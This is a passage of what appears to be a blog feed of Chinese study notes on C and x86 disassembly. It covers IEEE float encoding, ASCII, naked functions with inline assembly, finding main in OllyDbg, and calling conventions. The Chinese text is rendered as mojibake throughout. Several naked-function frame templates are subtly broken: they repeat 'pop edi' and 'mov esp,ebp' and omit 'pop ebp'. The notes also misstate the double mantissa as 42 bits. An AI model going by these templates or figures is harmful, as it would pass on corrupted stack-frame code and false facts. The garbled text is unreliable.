ä¸ºæ˜¯å·¦ç§»å°æ•°ç‚¹ï¼‰ï¼ŒæŒ‡æ•°3-1=2å˜æˆäºŒè¿›åˆ¶10ä»å³è¾¹å¼€å§‹æ”¾å…¥ã€‚è¿™å°±æ˜¯IEEEè§„èŒƒã€‚(å¯ä»¥æ„Ÿå—åˆ°æœ€éº»çƒ¦å°±æ˜¯ä¸­é—´è¿™æ®µçš„ç¡®å®šå€¼)<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716722496131.jpg" srcset="/img/loading.gif" alt="-w409"><br>æŒ‰å››ä½åˆ†å‰²<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000ï¼Œç„¶åå°±è¿™æ ·çš„å½¢å¼å­˜å…¥è®¡ç®—æœºå†…å­˜ã€‚</p><p>æˆ‘ä¸‹é¢ç”¨ç®€å•çš„ä¸”æ˜¯æ­£ç¡®çš„åŠæ³•æ¥è½¬æ¢ï¼š<br>å°†floatç±»å‹çš„12.5 è½¬æ¢æˆ16è¿›åˆ¶ï¼š<br>å…ˆæ•´ç†æ­£æ•°éƒ¨åˆ†ï¼Œ12=C=1100<br>å°æ•°éƒ¨åˆ† 0.5 * 2=1.0<br>æ‰€ä»¥äºŒè¿›åˆ¶å°±æ˜¯1100.1ï¼Œç§‘å­¦è®¡æ•°æ³• 1.1001x2^3<br>è¿™æ¬¡å¯¹ä¸­é—´æ ¼å­æ˜¯ç›´æ¥ç”¨<code>127+xçš„ç»“æœ</code> å˜æˆäºŒè¿›åˆ¶å¡«å……è¿™ä¸ªæ ¼å­ï¼Œxçš„å€¼å°±æ˜¯æŒ‡æ•°ï¼Œå…¶ä¸­<strong>å·¦ç§»æ˜¯æ­£å³ç§»ä¸ºè´Ÿ</strong><br> <img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15716732149036.jpg" srcset="/img/loading.gif" alt="-w382"></p><h4 id="doubleç±»å‹"><a href="#doubleç±»å‹" class="headerlink" title="doubleç±»å‹"></a>doubleç±»å‹</h4><p>å‰é¢è®²è§£äº†å•ç²¾åº¦æµ®ç‚¹ç±»å‹çš„IEEEç¼–ç ã€‚doubleç±»å‹å’Œfloatç±»å‹å¤§åŒå°å¼‚ï¼Œåªæ˜¯doubleç±»å‹è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œå ç”¨ç©ºé—´æ›´å¤šï¼Œæ˜¯floatç±»å‹æ‰€å ç”¨ç©ºé—´çš„ä¸¤å€ã€‚å½“ç„¶ï¼Œç²¾å‡†åº¦ä¹Ÿä¼šæ›´é«˜ã€‚</p><p>doubleç±»å‹å 8å­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼ŒåŒæ ·ï¼Œæœ€é«˜ä½ä¹Ÿç”¨äºè¡¨ç¤ºç¬¦å·ï¼ŒæŒ‡æ•°ä½å 11ä½ï¼Œå‰©<br>ä½™42ä½ç”¨äºè¡¨ç¤ºä½æ•°ã€‚<br>åœ¨floatä¸­ï¼ŒæŒ‡æ•°ä½èŒƒå›´ç”¨8ä½è¡¨ç¤ºï¼ŒåŠ 127åç”¨äºåˆ¤æ–­æŒ‡æ•°ç¬¦å·ã€‚åœ¨doubleä¸­ï¼Œç”±äºæ‰©å¤§äº†ç²¾åº¦ï¼Œå› æ­¤æŒ‡æ•°èŒƒå›´ä½¿ç”¨11ä½æ­£æ•°è¡¨ç¤ºï¼Œ<strong>åŠ 1023åå¯ç”¨äºæŒ‡æ•°ç¬¦å·åˆ¤æ–­</strong>ã€‚</p><p>doubleç±»å‹çš„IEEEç¼–ç è½¬æ¢è¿‡ç¨‹ä¸float ç±»å‹ä¸€æ ·ï¼Œå¯æ ¹æ®floatç±»å‹çš„è½¬æ¢æµç¨‹<br>æ¥è½¬æ¢doubleç±»å‹ã€‚<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717429314228.jpg" srcset="/img/loading.gif" alt="-w756"></p><h3 id="è‹±æ–‡å­—ç¬¦å­˜å‚¨"><a href="#è‹±æ–‡å­—ç¬¦å­˜å‚¨" class="headerlink" title="è‹±æ–‡å­—ç¬¦å­˜å‚¨"></a>è‹±æ–‡å­—ç¬¦å­˜å‚¨</h3><p>char x = â€˜Aâ€™;<br>å¯¹äºä¸€ä¸ªè‹±æ–‡å­—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æŸ¥ASCIIè¡¨è·å–å…¶å®šä¹‰çš„7ä½äºŒè¿›åˆ¶æ•°ï¼Œç„¶åè½¬æ¢å­˜å‚¨å…¶16è¿›åˆ¶æ”¾å…¥å†…å­˜ä¸­ã€‚ä¾‹ï¼š<br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717434285598.jpg" srcset="/img/loading.gif" alt="-w446"><br><img src="/2019/10/20/Cè¯­è¨€å­¦ä¹ ä¸åæ±‡ç¼–ï¼ˆä¸‰ï¼‰/images/15717434479758.jpg" srcset="/img/loading.gif" alt="-w420"><br>è¡¥å……ï¼š</p><ul><li>æ ‡å‡† ASCII ç ä½¿ç”¨ 7 ä½äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å’Œå°å†™å­—æ¯ï¼Œæ•°å­— 0 åˆ° 9ã€æ ‡ç‚¹ç¬¦å·ï¼Œä»¥åŠåœ¨ç¾å¼è‹±è¯­ä¸­ä½¿ç”¨çš„ç‰¹æ®Šæ§åˆ¶å­—ç¬¦ã€‚</li><li>ASCII ç ä½¿ç”¨æŒ‡å®šçš„ 7 ä½æˆ– 8 ä½äºŒè¿›åˆ¶æ•°ç»„åˆæ¥è¡¨ç¤º 128 æˆ– 256 ç§å¯èƒ½çš„å­—ç¬¦ã€‚</li><li>æ‰©å±• ASCII ç å…è®¸å°†æ¯ä¸ªå­—ç¬¦çš„ç¬¬ 8 ä½ç”¨äºç¡®å®šé™„åŠ çš„ 128 ä¸ªç‰¹æ®Šç¬¦å·å­—ç¬¦ã€å¤–æ¥è¯­å­—æ¯å’Œå›¾å½¢ç¬¦å·ã€‚</li></ul><p>ä¸ºä»€ä¹ˆä¸æ˜¯å…«ä½äºŒè¿›åˆ¶å‘¢ï¼Ÿå› ä¸ºå…¶ç¬¬ä¸€ä½éƒ½æ˜¯0ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œåœ¨èµ·åˆ7ä½å·²ç»æ»¡è¶³éœ€æ±‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰</title>
    <link href="/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹cæ˜¯å¦‚ä½•å˜æˆæ±‡ç¼–çš„ï¼ŒæŸ¥æ‰¾ç¨‹åºå…¥å£ï¼Œè°ƒç”¨çº¦å®šï¼Œå’Œä¸»è¦ç»ƒä¹ ä½¿ç”¨__declspec(naked)è£¸å‡½æ•°å®ç°éƒ¨åˆ†ç®€å•çš„åŠŸèƒ½å’Œå®Œæ•´çš„é€†ä¸€ä¸ªç®€å•EXEæˆcè¯­è¨€ã€‚</p><h2 id="è£¸å‡½æ•°"><a href="#è£¸å‡½æ•°" class="headerlink" title="è£¸å‡½æ•°"></a>è£¸å‡½æ•°</h2><h3 id="ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯è£¸å‡½æ•°ï¼Ÿ</h3><pre><code>void __declspec(naked) Function()  {.....}</code></pre><p>åœ¨ä»£ç ä¸­ç”³æ˜å‡½æ•°åï¼Œç¼–è¯‘æ—¶ï¼Œé™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸ä¼šä¸ºå‡½æ•°ä½“ç”Ÿæˆä»»ä½•ä»£ç ã€‚</p><h3 id="è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™"><a href="#è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™" class="headerlink" title="è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™"></a>è¿è¡Œè£¸å‡½æ•°ä¸ºä»€ä¹ˆä¼šå‡ºé”™</h3><p>ä»¥ä¸Šçš„è£¸å‡½æ•°è¿è¡Œåï¼Œå› ä¸ºç¼–è¯‘å™¨é™¤äº†å…¥å£å‚æ•°å‹æ ˆå¤–ï¼Œç„¶åå°±æ˜¯callè¿™ä¸ªå‡½æ•°ï¼Œä¸ä¼šç»™å…¶ç”Ÿæˆä»»ä½•çš„æ±‡ç¼–ä»£ç ï¼Œæ‰€ä»¥æ˜æ˜¾è¿è¡Œåå…¶æ— æ³•å›åˆ°åŸæ¥çš„ä¸»å‡½æ•°ï¼Œç„¶åå †æ ˆæ˜¯ä¸å¹³è¡¡çš„ã€‚æ‰€ä»¥ï¼š</p><pre><code>void __declspec(naked) Function()  {    __asm ret}</code></pre><p>åŠ ä¸€ä¸ªretå°±å¥½äº†ï¼Œä¸ä¼šå†æŠ¥é”™äº†ã€‚</p><h3 id="è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ"><a href="#è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ" class="headerlink" title="è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ"></a>è£¸å‡½æ•°æ¡†æ¶ç®€å•é›†åˆ</h3><h4 id="æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"><a href="#æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"></a>æ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"><a href="#æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶"></a>æœ‰å‚æ•°æœ‰è¿”å›å€¼çš„å‡½æ•°æ¡†æ¶</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //ä¸»è¦åŠŸèƒ½        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><h4 id="å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶"><a href="#å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶" class="headerlink" title="å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶"></a>å¸¦å±€éƒ¨å˜é‡çš„å‡½æ•°æ¡†æ¶</h4><pre><code>void __declspec(naked) Function()  {    __asm    {        push ebp        mov ebp,esp        sub esp,0x40        push ebx        push esi        push edi        lea edi,dword ptr ds:[ebp-0x40]        mov eax,0xCCCCCCCC        mov ecx,0x10        rep stosd        //ä¸»è¦åŠŸèƒ½        mov dword ptr ds:[ebp-4],2        mov dword ptr ds:[ebp-8],3        mov eax,dword ptr ds:[ebp+8]        add eax,dword ptr ds:[ebp+0xC]        //æ³¨æ„æ±‡ç¼–ä¸­å±€éƒ¨å˜é‡çš„å­˜æ”¾åŠæ³•            pop edi        pop edi        pop esi        pop ebx        mov esp,ebp        mov esp,ebp        ret    }}</code></pre><p><strong>åœ¨ç»ƒä¹ ä¸­å‘ç°å¯¹å±€éƒ¨å˜é‡åœ¨æ±‡ç¼–ä¸­å¦‚ä½•å­˜æ”¾ï¼Œå¦‚ä½•ä½“ç°æœ‰äº›ç”Ÿç–ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚</strong></p><h3 id="é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ "><a href="#é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ " class="headerlink" title="é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ "></a>é’ˆå¯¹è£¸å‡½æ•°çš„ç»ƒä¹ </h3><p>ç›®æ ‡æ˜¯è¦å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š</p><pre><code>int plus(int x,int y,int z){    int a = 2;    int b = 3;    int c = 4;    return x+y+z+a+b+c;}</code></pre><p>ä»£ç ï¼š</p><pre><code>// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked)  plus(int x,int y,int z){    __asm    {        push ebp        mov ebp,esp        sub esp,0x40    //å¼€æ ˆ        push ebx        push esi        push edi        //ä¿æŠ¤ç°åœº        lea edi,dword ptr ds:[ebp-0x40]        mov ecx,0x10        mov eax,0xCCCCCCCC        rep stosd        //ä¸ºç¼“å†²åŒºå¡«å……æ•°æ®        //çœŸæ­£è¦æ‰§è¡Œçš„åŠŸèƒ½        //å±€éƒ¨å˜é‡ï¼šEBPâ€”4å¼€å§‹ å‚æ•°ï¼šebp+8å¼€å§‹        //ebp+4æ˜¯eip åŸæ¥callä¸‹æ¡è¯­å¥        mov eax,0x2        mov dword ptr ds:[ebp-0x4],eax        mov eax,0x3        mov dword ptr ds:[ebp-0x8],eax        mov eax,0x4        mov dword ptr ds:[ebp-0x0C],eax  //æ”¾å…¥å±€éƒ¨å˜é‡        mov eax,dword ptr ds:[ebp+0x8]        add eax,dword ptr ds:[ebp+0x0C]        add eax,dword ptr ds:[ebp+0x10]        add eax,dword ptr ds:[ebp-0x4]        add eax,dword ptr ds:[ebp-0x8]        add eax,dword ptr ds:[ebp-0x0C]         mov dword ptr ds:[ebp-0x4],eax    //æŠŠè®¡ç®—ç»“æœæ”¾å…¥æ ˆä¸­ï¼Œä¸‹é¢ä¸»å‡½æ•°æ‰“å°aæ—¶è¦ç”¨åˆ°        pop edi;        pop esi;        pop ebx;        mov esp,ebp        pop ebp        ret    }}int main(int argc, char* argv[]){    int a;    a=plus(6,7,8);    printf(&quot;%d\n&quot;,a);    return 0;}</code></pre><p>ç»ƒä¹ è¿™ä¸ªå¯ä»¥æ›´åŠ ç†Ÿæ‚‰å †æ ˆç»“æ„ï¼Œå‚æ•°ã€å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚</p><h2 id="ç¨‹åºçœŸæ­£çš„å…¥å£"><a href="#ç¨‹åºçœŸæ­£çš„å…¥å£" class="headerlink" title="ç¨‹åºçœŸæ­£çš„å…¥å£"></a>ç¨‹åºçœŸæ­£çš„å…¥å£</h2><p>main æˆ–WinMain æ˜¯â€œè¯­æ³•è§„å®šçš„ç”¨æˆ·å…¥å£â€ï¼Œè€Œä¸æ˜¯â€œåº”ç”¨ç¨‹åºå…¥å£â€ã€‚åº”ç”¨ç¨‹åºå…¥å£é€šå¸¸æ˜¯å¯åŠ¨å‡½æ•°ã€‚</p><p>åœ¨ODä¸­é»˜è®¤è®¾ç½®å°±æ˜¯åˆ°winmainå…¥å£å°±æš‚åœç¨‹åºï¼Œå…¶å¹¶ä¸æ˜¯ä¸»å‡½æ•°å…¥å£ã€‚å…¶å®æ¯ä¸€ç§ç¼–è¯‘å™¨éƒ½æœ‰è‡ªå·±ä¸€å¥—çš„ç¼–è¯‘æ ‡å‡†ï¼Œåœ¨ä¸»å‡½æ•°å¯åŠ¨å‰è¦åšä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œä¸‹é¢æˆ‘åˆ†æçš„æ˜¯vc6.0çš„ã€‚</p><h3 id="main-å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾"><a href="#main-å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾" class="headerlink" title="main å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾"></a>main å‡½æ•°çš„è¯†åˆ«ä¸å¯»æ‰¾</h3><p><strong>åªæ˜¯vc++6.0</strong><br>main å‡½æ•°è¢«è°ƒç”¨å‰è¦å…ˆè°ƒç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715025630158.jpg" srcset="/img/loading.gif" alt="-w414"><br>è¿™äº›å‡½æ•°è°ƒç”¨ç»“æŸåå°±ä¼šè°ƒç”¨main å‡½æ•°ï¼Œæ ¹æ®main å‡½æ•°è°ƒç”¨çš„ç‰¹å¾ï¼Œå°†3ä¸ªå‚æ•°å‹å…¥æ ˆå†…ä½œä¸ºå‡½æ•°çš„å‚æ•°ã€‚<br>æ‰€ä»¥åœ¨winmainåœä¸‹åï¼Œå¯ä»¥ä¸€ç›´å•æ­¥è°ƒè¯•ï¼Œé‡åˆ°callçš„æ—¶å€™ï¼Œæ³¨æ„å‰æ–¹æ˜¯ä¸æ˜¯æœ‰3ä¸ªå‚æ•°è¢«å‹å…¥æ ˆäº†ï¼Œæ˜¯çš„è¯è¿™ä¸ªå¯ä»¥åŸºæœ¬åˆ¤æ–­å®ƒcallçš„å°±æ˜¯mainå‡½æ•°ç›´æ¥æ­¥è¿‡è¿›å»å³å¯ï¼Œä½†æ˜¯è¿™ä¸ªä¹Ÿä¸æ˜¯ä¸€å®šçš„ï¼Œç»“åˆæ™ºèƒ½odçš„æ³¨é‡Šï¼Œæ³¨é‡Šæœ‰winå†…æ ¸å‡½æ•°è°ƒç”¨å°±ä¸è¦è¿›å…¥å‡½æ•°å°±å¯ä»¥äº†ã€‚</p><h2 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h2><p>å¸¸è§çš„å‡ ç§çº¦å®šï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715066318478.jpg" srcset="/img/loading.gif" alt="-w355"></p><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>ä½¿ç”¨VC++ (å…³é—­ä¼˜åŒ–é€‰é¡¹)ç¼–è¯‘ä»£ç ç”Ÿæˆcdecl.exeæ–‡ä»¶åï¼Œä½¿ç”¨OllyDbgè°ƒè¯•:å‡½æ•°çš„å‚æ•°1ã€2ä»¥é€†åºæ–¹å¼å‹äººæ ˆï¼Œ<br>è°ƒç”¨Plus(å‡½æ•°( 401014)åï¼Œä½¿ç”¨ADD ESP,8å‘½ä»¤æ•´ç†æ ˆã€‚è°ƒç”¨è€…main()å‡½æ•°ç›´æ¥æ¸…ç†å…¶å‹å…¥æ ˆçš„å‡½æ•°å‚æ•°ï¼Œè¿™æ ·çš„æ–¹å¼å³æ˜¯cdeclã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715038333622.jpg" srcset="/img/loading.gif" alt="-w267"></p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcallå¸¸ç”¨äºwin32 apiï¼Œåœ¨å¾€åçš„VBä¸­å¾ˆå¸¸è§ã€‚è¿™ä¸ªæ˜¯è‡ªèº«å‡½æ•°å†…éƒ¨è¿›è¡Œæ ˆæ¸…ç†ã€‚è‹¥æƒ³ä½¿ç”¨stdcallæ–¹å¼ç¼–è¯‘æºç ï¼Œåªè¦ä½¿ç”¨<code>_ stdcall</code>å…³é”®å­—å³å¯ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715038140613.jpg" srcset="/img/loading.gif" alt="-w295"><br>æ ˆçš„æ¸…ç†å·¥ä½œç”±add(å‡½æ•°ä¸­æœ€å( 40100F)çš„RETN 8å‘½ä»¤æ¥æ‰§è¡Œã€‚RETN 8å‘½ä»¤çš„å«ä¹‰ä¸ºRETN+POP 8å­—èŠ‚ï¼Œå³è¿”å›åä½¿ESPå¢åŠ åˆ°æŒ‡å®šå¤§å°ã€‚</p><p>åƒè¿™æ ·åœ¨è¢«è°ƒç”¨è€…add)å‡½æ•°å†…éƒ¨æ¸…ç†æ ˆçš„æ–¹å¼å³ä¸ºstdcallæ–¹å¼ã€‚stdcallæ–¹å¼çš„å¥½å¤„åœ¨äºï¼Œ <strong>è¢«è°ƒç”¨è€…å‡½æ•°å†…éƒ¨å­˜åœ¨ç€æ ˆæ¸…ç†ä»£ç ï¼Œä¸æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶éƒ½è¦ç”¨ADD ESP,XXXå‘½ä»¤çš„cdecIæ–¹å¼ç›¸æ¯”ï¼Œä»£ç å°ºå¯¸è¦å°</strong>ã€‚</p><p><strong>è™½ç„¶Win 32 APIæ˜¯ä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„åº“ï¼Œä½†å®ƒä½¿ç”¨çš„æ˜¯stdcallæ–¹å¼ï¼Œè€Œä¸æ˜¯Cè¯­è¨€é»˜è®¤çš„cdeclæ–¹å¼ã€‚</strong>è¿™æ˜¯ä¸ºäº†è·å¾—æ›´å¥½çš„å…¼å®¹æ€§ï¼Œä½¿Cè¯­è¨€ä¹‹å¤–çš„å…¶ä»–è¯­è¨€( Delphi(Pascal)ã€Visual Basicç­‰)ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨APIã€‚</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcalæ–¹å¼ä¸stdcallæ–¹å¼åŸºæœ¬ç±»ä¼¼ï¼Œä½†è¯¥æ–¹å¼é€šå¸¸ä¼šä½¿ç”¨å¯„å­˜å™¨(è€Œéæ ˆå†…å­˜)å»ä¼ é€’é‚£äº›éœ€è¦ä¼ é€’ç»™å‡½æ•°çš„éƒ¨åˆ†å‚æ•°(å‰2ä¸ª)ã€‚è‹¥æŸå‡½æ•°æœ‰4ä¸ªå‚æ•°ï¼Œåˆ™å‰2ä¸ªå‚æ•°åˆ†åˆ«ä½¿ç”¨ECXã€EDXå¯„å­˜å™¨ä¼ é€’ã€‚</p><p>é¡¾åæ€ä¹‰ï¼Œfastcallæ–¹å¼çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¯¹å‡½æ•°çš„å¿«é€Ÿè°ƒç”¨(ä»CPUçš„ç«‹åœºçœ‹ï¼Œè®¿é—®å¯„å­˜å™¨çš„é€Ÿåº¦è¦è¿œæ¯”å†…å­˜å¿«å¾—å¤š)ã€‚å•ä»å‡½æ•°è°ƒç”¨æœ¬èº«æ¥çœ‹ï¼Œfastcallæ–¹å¼éå¸¸å¿«ï¼Œä½†æ˜¯æœ‰æ—¶éœ€è¦é¢å¤–çš„ç³»ç»Ÿå¼€é”€æ¥ç®¡ç†ECXã€EDXå¯„å­˜å™¨ã€‚å€˜è‹¥è°ƒç”¨å‡½æ•°å‰ECXä¸EDXä¸­å­˜æœ‰é‡è¦æ•°æ®ï¼Œé‚£ä¹ˆä½¿ç”¨å®ƒä»¬å‰å¿…é¡»å…ˆå¤‡ä»½ã€‚æ­¤å¤–,å¦‚æœå‡½æ•°æœ¬èº«å¾ˆå¤æ‚ï¼Œéœ€è¦æŠŠECXã€EDXå¯„å­˜å™¨ç”¨ä½œå…¶ä»–ç”¨é€”æ—¶ï¼Œä¹Ÿéœ€è¦å°†å®ƒä»¬ä¸­çš„å‚æ•°å€¼å­˜å‚¨åˆ°å¦å¤–æŸä¸ªåœ°æ–¹ã€‚æœ‰èˆä¹Ÿæœ‰å¾—ã€‚</p><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715042971030.jpg" srcset="/img/loading.gif" alt="-w292"><br>å°±è·Ÿè¿™ç§æƒ…å†µï¼Œä¸€å®šè¦æ³¨æ„å…¶æ˜¯ç›´æ¥ç”¨å¯„å­˜å™¨æ¥ä¼ å‚å’Œè®¡ç®—çš„ï¼Œä¸æ¶‰åŠæ ˆï¼Œä¸è¿‡è¿™ä¸ªä¸å¸¸ç”¨ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715043849420.jpg" srcset="/img/loading.gif" alt="-w330"><br>è¿™ä¸ªå°±æ˜¯å¸¸ç”¨çš„æƒ…å†µï¼Œä¼ å‚çš„æ—¶å€™ä¼šæŠŠéƒ¨åˆ†çš„å‚æ•°ç”¨å¯„å­˜å™¨æ¥ä¼ ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention-exeï¼‰"><a href="#ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention-exeï¼‰" class="headerlink" title="ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention.exeï¼‰"></a>ç¬¬ä¸€æ¬¡å®Œæ•´é€†ä¸€ä¸ªexeï¼ˆCallingConvention.exeï¼‰</h2><h3 id="æ±‡ç¼–åˆ†æ"><a href="#æ±‡ç¼–åˆ†æ" class="headerlink" title="æ±‡ç¼–åˆ†æ"></a>æ±‡ç¼–åˆ†æ</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715046760959.jpg" srcset="/img/loading.gif" alt="-w855"><br>ç®€å•ä¸€çœ‹ï¼Œè¿™ä¸ªå°±æ˜¯åœåœ¨winmainå…¥å£äº†ï¼Œæ³¨æ„å¯»æ‰¾å‰é¢æ‰€è¯´çš„é‚£ä¸ªæ‰¾callä¹‹å‰æœ‰3ä¸ªå‚æ•°å‹æ ˆæœ€ä¸ºå‡½æ•°å‚æ•°çš„è¯­å¥ï¼Œä¸€ç›´å•æ­¥èµ°ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715049691652.jpg" srcset="/img/loading.gif" alt="-w679"><br>ç–‘ä¼¼å‡ºç°ç¬¦åˆçš„æƒ…å†µï¼Œè¿™æ—¶å€™æŒ‰<code>F7</code>è¿›å»æŸ¥çœ‹å†…éƒ¨ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715050273427.jpg" srcset="/img/loading.gif" alt="-w535"><br>ç®€å•ä¸€çœ‹ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„mainå‡½æ•°ã€‚<br><strong>æ¥ä¸‹æ¥ä¸ºäº†åŠ å¼ºåˆ†æå¯è§‚æ€§ï¼Œæˆ‘æŠŠæ±‡ç¼–ä»£ç éƒ½æ”¾è¿›äº†WPSä¸­è¿›è¡Œåˆ†æ</strong>ï¼š<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäºŒï¼‰/images/15715051301041.jpg" srcset="/img/loading.gif" alt="-w1307"><br><img 